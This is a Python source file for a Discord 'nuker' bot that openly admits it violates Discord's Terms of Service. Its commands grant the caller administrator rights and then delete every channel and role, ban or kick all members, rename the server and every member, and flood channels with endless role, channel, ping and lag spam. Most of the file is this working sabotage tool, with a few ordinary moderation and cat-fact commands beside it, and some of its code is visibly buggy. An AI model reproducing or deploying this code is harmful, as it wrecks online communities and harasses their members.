import os
import requests
import aiohttp
from discord import Permissions, message 
import discord,random,time
import json
from discord.ext import commands  
import colorama
import asyncio
from colorama import Fore
from discord import Embed 

colorama.init()
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=">",intents=intents)
bot.remove_command("commands")
with open('config.json') as f:
    data = json.load(f)
    token = data["TOKEN"]
  
print('''

███╗   ██╗██╗   ██╗██╗  ██╗███████╗    ██████╗  ██████╗ ████████╗
████╗  ██║██║   ██║██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗╚══██╔══╝
██╔██╗ ██║██║   ██║█████╔╝ █████╗      ██████╔╝██║   ██║   ██║   
██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝      ██╔══██╗██║   ██║   ██║   
██║ ╚████║╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝   ██║   
╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝    ╚═╝  
By BlackCat1412    
''')

input("""
WARNING - This bot goes against Discord ToS:
Press Any 'Enter' Keys To Continue: """)

print ("\nMonitoring... \n")

@bot.event
async def on_ready():
    print(f'{bot.user.name}')
    print(f'Logged in and Ready <3')

@bot.command()
async def d(ctx,channel_id="all"):
  await ctx.message.delete()
  if channel_id == "all":
    for channel in ctx.guild.channels:
      if channel.id != 834134636678479902:
        await channel.delete()
      else:
        continue
    await ctx.guild.create_text_channel(name="nuked")
    print("Nuked All Channels")
    return
  else:
    try:
      channel = ctx.get.channel(id=iny(channel_id))
      await channel.delete()
    except:
      e2 = discord.Embed(title = "Invaild Channel ID.", color = 0xaf1aff)
      await ctx.send(embed=e2)
    return

@bot.command(pass_context=True)
async def admin(ctx):
    await ctx.message.delete() 
    try:
        guild = ctx.guild
        role = await guild.create_role(name="N1gh7 L1gh7", permissions=discord.Permissions(8),colour=discord.Colour(0x03011b))
        authour = ctx.message.author
        await authour.add_roles(role)
        print("Gave you admin <3")
    except:
        print("Couldnt give you admin :(")

@bot.command()
async def rspam(ctx):
 while True:
   await ctx.guild.create_role(name="Night Light NUKER")
   print("Spamming roles <3")
   
@bot.command()
async def colourRspam(ctx):
 while True:
   await ctx.guild.create_role(name="Night Light RUNS YOU",colour=discord.Colour(0x03011b))
   await ctx.guild.create_role(name="Night Light RUNS YOU",colour=discord.Colour(0xff0c0c))
   await ctx.guild.create_role(name="Night Light RUNS YOU",colour=discord.Colour(0x220cff))
   await ctx.guild.create_role(name="Night Light RUNS YOU",colour=discord.Colour(0x0cf2ff))
   await ctx.guild.create_role(name="Night Light RUNS YOU",colour=discord.Colour(0x0cff1e))
   await ctx.guild.create_role(name="Night Light RUNS YOU",colour=discord.Colour(0xff0c79))
   print("Spamming roles <3")
@bot.command()
async def rdelete(ctx):
  for role in ctx.guild.roles:
    try:
      await role.delete()
    except:
      pass 
  embed = Embed(title="Done Deleting All Roles", color=0xaf1aff)
  await ctx.send(embed=embed)
  await ctx.message.delete()


@bot.command()
async def cspam(ctx,amount=10,name_of_channel="nuked"):
  await ctx.message.delete() 
  for times in range(amount):
    await ctx.guild.create_text_channel(name_of_channel)
  em3 = discord.Embed(title = f"Im Done spamming ***{amount}*** amount of channels named ***{name_of_channel}***", color = 0xaf1aff)
  print(f"Spammed {amount} Channels <3")

  await ctx.send(embed=em3)

@bot.command()
async def vcspam(ctx,amount=10,name_of_channel="nuked"): 
  await ctx.message.delete()
  for times in range(amount):
    await ctx.guild.create_voice_channel(name_of_channel)
  em3 = discord.Embed(title = f"Im Done spamming ***{amount}*** amount of voice channels named ***{name_of_channel}***", color = 0xaf1aff)
  print(f"Spammed {amount} Voice Channels <3")
  await ctx.send(embed=em3)

@bot.command()
async def banAll(ctx):
 await ctx.message.delete()
 for user in ctx.guild.members:
        try:
            await user.ban()
            print(f"Banned {user}")
        except:
           pass
@bot.command()
async def kickAll(ctx):
 await ctx.message.delete()
 #print("Kicked all members <3 ~")
 for user in ctx.guild.members:
        try:
            await user.kick()
            print(f"Kicked {user}")
        except:
           pass

@bot.command()
async def CommandTypes(ctx):
  await ctx.message.delete()
  embed1 = Embed(title="Command Types", color=0xff057a)
  embed1.add_field(name=">nk commands ", value="Nuke function [WARNING: Against Discord ToS]", inline=False)
  embed1.add_field(name=">mod commands ", value="Mod functions", inline=False)
  embed1.add_field(name=">basic commands ", value="Member's command", inline=False)
  embed1.set_image(url="https://c.tenor.com/BuhiGfNC1LoAAAAC/blackcat-gif.gif")
  embed1.set_footer(text="By BlackCat1412")
  await ctx.send(embed=embed1)
  

@bot.command()
async def nk(ctx,channel_id="commands"):
 await ctx.message.delete()
 embed1 = Embed(title="Night Light Nuker Help", color=0x220cff)
 embed1.add_field(name=">commands ", value="Sends This Message", inline=False)
 embed1.add_field(name=">cspam [Amount] Channel Name", value="Spams Channels", inline=True)
 embed1.add_field(name=">d all", value="Nukes All Channels", inline=False)
 embed1.add_field(name=">banAll", value="Bans all members", inline=False)
 embed1.add_field(name=">pingspam", value="Locks all channels And Spam Pings", inline=False) 
 embed1.add_field(name=">admin", value="Gives user Admin.", inline=False)
 embed1.add_field(name=">vcspam [Amount] [Channel Name]", value="Spams Voice Channels", inline=False)  
 embed1.add_field(name=">servername [Name]", value="Changes Server Name", inline=False)
 embed1.add_field(name=">nickall [Name]", value="Changes Everyones Names", inline=False)
 embed1.add_field(name=">rspam", value="Spams Roles", inline=False)
 embed1.add_field(name=">rdelete", value="Deletes All Roles Below the Bot", inline=False)
 embed1.add_field(name=">kickAll", value="Kicks All", inline=False)
 embed1.add_field(name=">colourRspam", value="Spams roles with pretty colours", inline=False)
 embed1.add_field(name=">lagspam", value="Lags Peoples Discords", inline=False)
 embed1.add_field(name=">chspam", value="Spams in all channels", inline=False)
 embed1.add_field(name=">creacha [0-100]", value="Creates channels", inline=False)
 embed1.add_field(name=">getserverinfo [discord.gg/]", value="Gets server raw/invite info", inline=False)
 embed1.set_image(url="https://media.tenor.com/QVO4cun51cAAAAAC/gojo-satoru-jujutsu-kaisen.gif")     
 embed1.set_footer(text="By BlackCat1412")
 await ctx.send(embed=embed1)

@bot.command()
async def basic(ctx, channel_id="commands"):
 await ctx.message.delete()
 embed1 = Embed(title="Moderation Commands", color=0x05ffee)
 embed1.add_field(name=">CatFact", value="Sends random cat facts", inline=False)

 embed1.set_image(url="https://i.pinimg.com/originals/de/71/31/de713116bee934b90e65eccfa074eb93.gif")   
 embed1.set_footer(text="By BlackCat1412")
 await ctx.send(embed=embed1)

@bot.command()
async def mod(ctx, channel_id="commands"):
 await ctx.message.delete()
 embed1 = Embed(title="Moderation Commands", color=0xff0505)
 embed1.add_field(name=">Ban [member]", value="Bans a specific member", inline=False)
 embed1.add_field(name=">Unban [member]", value="Unbans a specific member", inline=False)
 embed1.add_field(name=">Kick [member]", value="Kicks a specific member", inline=False)
 embed1.add_field(name=">Timeout [member]", value="Timeout a specific member", inline=False)
 embed1.add_field(name=">Untimeout [member]", value="Untimeout a specific member", inline=False)
 embed1.set_image(url="https://i.pinimg.com/originals/94/7e/a3/947ea340e46d882c193f50d297e2d26c.jpg")   
 embed1.set_footer(text="By BlackCat1412")
 await ctx.send(embed=embed1)
  
@bot.command()
async def pingspam(ctx):
    await ctx.guild.edit(name="NUKED BY NightLight")
    print("Wrecked channels <3")
    latters = "a:b:c:d:e:f:g:h:i:j:k:l:m:n:o:p:q:r:s:t:u:v:w:x:y:,:+:*:/:#: "
    lattersL = latters.split()
    while True:
      for time in range(random.randint(4,10)):
        r1 = random.choice(lattersL)
      try:
        await guild.create_text_channel("nuked")
        await guild.create_voice_channel("nuked")
      except:
        pass 
      for channel in ctx.guild.text_channels:
        try:
          webhook = discord.utils.get(await ctx.channel.webhooks(), name='Spammer')
          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU         {r1}")
          await ctx.channel.create_webhook(name="wizzed by tool")
          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU   {r1}")
          await ctx.channel.create_webhook(name="wizzed")
          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU                {r1}")
          await ctx.channel.create_webhook(name="wizzed by tool")
          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU     {r1}")
          await ctx.channel.create_webhook(name="wizzed")
          await channel.send(f"Nuked! @everyone https://discord.gg/A7nAbRFdjD TOOL RUNS YOU              {r1}")
          await webhook.send()
        except:
          pass 
@bot.command()
async def lagspam(ctx):
  while True:
    for channel in ctx.guild.text_channels:
      await channel.send(":chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains: :chains:")
      print("Lagging Channels")
@bot.command()
async def servername(ctx, name = None): 
  if name != None:
    await ctx.guild.edit(name=f"{name}")
    print("Changed Server Name")
    em200 = Embed(color = 0xaf1aff, title=f"Changed the server name to: ***{ctx.guild.name}***")
    await ctx.send(embed=em200, delete_after=8) 
  else:  
    em100 = Embed(color = 0xaf1aff, title=ctx.guild.name)
    em1001 = await ctx.send(embed=em100)
    time.sleep(8)
    await em1001.delete()
@bot.command()
async def nickall(ctx, *, name="! TOOL RUNS YOU"):
  print("Nicking All")
  for member in ctx.guild.members:
    try:
      await member.edit(nick=name)
    except:
      pass 

@bot.command()
async def chspam(ctx):
    channels = ctx.guild.channels
    while True:
      for channel in channels:
       await channel.send('**SPAMMING**')
       await channel.send('# *__Nuked by RDx_NàMèLéss!!!__*')

@bot.command()
async def creacha(ctx, amount=100, name_of_channel="NUK3D"):
  await ctx.message.delete()
  for times in range(amount):
    await ctx.guild.create_text_channel(name_of_channel)
    try:
          num_channels = int(ctx.content.split()[1])
          for i in range(num_channels):
              await ctx.guild.create_text_channel(f"channel-{i+1}")
          await ctx.channel.send(
              f"Created {num_channels} channels."
          )
    except:
          await ctx.channel.send(
              "Creating channels..."
          )
  else:
      await ctx.channel.send(
          "All channels created"
      )


@bot.command()
async def getserverinfo(ctx):
    invite_url = ctx.message.content.split(' ')[1]
    if 'https://discord.gg/' in invite_url:
        invite_code = invite_url.split('https://discord.gg/')[1]
    else:
        invite_code = invite_url
    async with aiohttp.ClientSession() as session:
        async with session.get(f'https://discord.com/api/v9/invites/{invite_code}') as response:
            if response.status == 200:
                invite_data = await response.json()
                print(invite_data)
                await ctx.channel.send(f"```{invite_data}```")
            else:
                error_data = await response.json()
                print(f"Failed to fetch invite data for {invite_code}. Error: {error_data}")

@bot.command()
async def Ban(ctx, member: discord.Member):
    await member.ban()
    await ctx.send(f'Banned {member.mention}')

@bot.command()
async def Unban(ctx, member: discord.Member):
  await ctx.guild.unban(member)
  await ctx.send(f'Unbanned {member.mention}')

@bot.command()
async def Kick(ctx, member: discord.Member):
   await member.kick()
   await ctx.send(f'Kicked {member.mention}')

@bot.command()
async def Timeout(ctx, member: discord.Member, duration: int, reason: str):
   await member.timeout(duration=duration, reason=reason)
   await ctx.send(f'Timed out {member.mention} for {duration} seconds with reason: {reason}')

@bot.command()
async def Untimeout(ctx, member: discord.Member):
  await member.remove_timeout() 
  await ctx.send(f'Removed timeout from {member.mention}')

@bot.command()
async def CatFact(ctx):
  async with aiohttp.ClientSession().get("https://catfact.ninja/fact") as response:
      fact = (await response.json())["fact"]
      length = (await response.json())["length"]
      embed = discord.Embed(title=f'Random Cat Fact Number: **{length}**', description=f'Cat Fact: {fact}', colour=0x400080)
      embed.set_footer(text="")
      await ctx.send(embed=embed)

bot.run(os.getenv('TOKEN'))